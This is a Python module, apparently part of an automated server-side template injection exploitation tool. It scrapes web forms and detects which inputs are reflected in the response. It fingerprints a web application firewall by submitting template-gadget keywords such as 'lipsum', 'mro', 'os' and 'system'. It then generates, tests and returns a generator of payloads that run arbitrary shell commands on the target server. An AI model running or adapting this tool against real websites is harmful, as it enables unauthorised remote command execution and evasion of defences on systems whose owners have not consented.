from .shell_cmd import exec_cmd_payload

import random
import time
import logging

from urllib.parse import urlparse, urlunparse
from functools import wraps, partial, lru_cache
from collections import Counter
from typing import Iterable
from itertools import groupby

from bs4 import BeautifulSoup
import requests

logger = logging.getLogger("test_form")


def retry_status_code(status_codes = (429, )):
    def _decorator(f):
        @wraps(f)
        def f1(*args, **kwargs):

            resp = f(*args, **kwargs)
            while resp.status_code in status_codes:
                time.sleep(0.5)
                resp = f(*args, **kwargs)
            return resp
        return f1
    return _decorator

def base_request(*args, **kwargs):
    session = requests.Session()
    session.mount("http://", requests.adapters.HTTPAdapter(max_retries=10))
    session.mount("https://", requests.adapters.HTTPAdapter(max_retries=10))
    while True:
        try:
            r = session.request(*args, **kwargs)
            return r
        except requests.exceptions.Timeout:
            continue

common_request = retry_status_code([429, ])(base_request)

def Form(*, uri: str, inputs: Iterable, method: str = "POST"):
    """
    the form we use
    """
    method = method.upper()
    if not uri.startswith("/"):
        uri = "/" + uri
    assert method in ["GET", "POST"]
    return {
        "uri": uri,
        "method": method,
        "inputs": set(inputs)
    }

def parse_forms(url, html):
    """
    get forms from a html of a url
    """
    parsed_url = urlparse(url)
    uri = parsed_url[3]
    bs = BeautifulSoup(html, "html.parser")

    details = []
    for form_element in bs.select("form"):
        form = Form(
            uri = form_element.attrs.get("action", uri), 
            method = form_element.attrs.get("method", "POST").upper(), 
            inputs = [
                element.attrs["name"]
                for element in form_element.select("input")
            ]
        )
        details.append(form)
    return details

def randomly_fill(form):
    """
    randomli fill the form
    """
    return {
        k : "".join(random.choices([chr(i) for i in range(96 + 1, 96 + 27)], k = 8))
        for k in form["inputs"]
    }

def fill_form(url, form, form_inputs):
    """
    fill the form and return keyword arguments for the requests module
    """
    return {
        "url": urlunparse(urlparse(url)._replace(path = form["uri"])),
        "method": form["method"],
        ("data" if form["method"] == "POST" else "params"): form_inputs
    }

def get_possible_input(url: str, form):
    """
    test the form and return inputs that might be vulunable
    """
    form_inputs = randomly_fill(form)
    kwargs = fill_form(url, form, form_inputs)
    resp = common_request(**kwargs)
    return [
        k for k, v in form_inputs.items()
        if v in resp.text
    ]

def submit_form_input(url: str, form: dict, inputs: dict):
    """
    submit the form inside the url with the inputs
    """
    logger.info(f"submit {inputs=}")
    form_inputs = randomly_fill(form)
    form_inputs.update(inputs)
    kwargs = fill_form(url, form, form_inputs)
    if any(len(v) > 2048 for v in form_inputs.values()) and form["method"] == "GET":
        logger.warning("some inputs are extremely long that the request might fail")
    resp = common_request(**kwargs)
    return resp

def test_dangerous_keywords(url, form, input_field):
    """
    test some dangerous keywords and return some hashes of response text.
    the hashes represent what the result would be when inputs get WAF.
    """
    keywords = [
        "config", "self", "g", "os", "class", "length", "mro", "base", "request", "lipsum",
        "attr", "open", "system",
        "[", '"', "'", "_", ".", "+", "~", "{{", "|",
        "0", "1", "2", 
        "０","１","２",
    ]
    resps = {
        keyword : submit_form_input(url, form, {input_field: keyword * 10})
        for keyword in keywords
    }
    resp_hashes = [
        hash(resp.text) for resp in resps.values()
        if resp.status_code != 500
    ]
    return [pair[0] for pair in Counter(resp_hashes).most_common(2)]

def check_waf(url, form, input_field, input_value, waf_hash):
    """
    submit a form and check whether the input get WAFed.
    if it is blocked return False otherwise return True
    """
    resp = submit_form_input(url, form, {input_field:input_value})
    return hash(resp.text) not in waf_hash

def test_form(url, form):
    """
    test whether a form is vulunable,
    if it is, return a function that generate shell command payload.
    """
    cmd = "echo y a  y;"
    logger.info(f"Start testing form, {form=}")
    possible_inputs = get_possible_input(url, form)
    logger.info(f"These inputs might be vulunable: {possible_inputs}")
    for possible_input in possible_inputs:
        logger.info(f"Tesing: {possible_input}")
        waf_hash = test_dangerous_keywords(url, form, possible_input)
        waf_func = lambda value : check_waf(url, form, possible_input, value, waf_hash)
        waf_func = lru_cache(200)(waf_func)
        result = exec_cmd_payload(waf_func, cmd)
        if result is None:
            logger.info(f"Testing {possible_input} Failed.")
            continue
        payload, will_print = result
        if will_print:
            logger.warning(f"Input {repr(possible_input)} looks great, testing generated payload.")
            resp = submit_form_input(url, form, {possible_input:payload})
            if "y a y" in resp.text:
                logger.warning(f"Success! return a payload generator.")
            else:
                logger.warning(f"Test Payload Failed! return a payload generator anyway.")
            return possible_input, (lambda cmd: exec_cmd_payload(waf_func, cmd))
        else:
            logger.warning(
                f"Input {possible_input} looks great, but we WON'T SEE the execution result! "+
                "You can try using the payload generator however.")
            return possible_input, (lambda cmd: exec_cmd_payload(waf_func, cmd))

    logger.warning(f"Failed...")
    return None
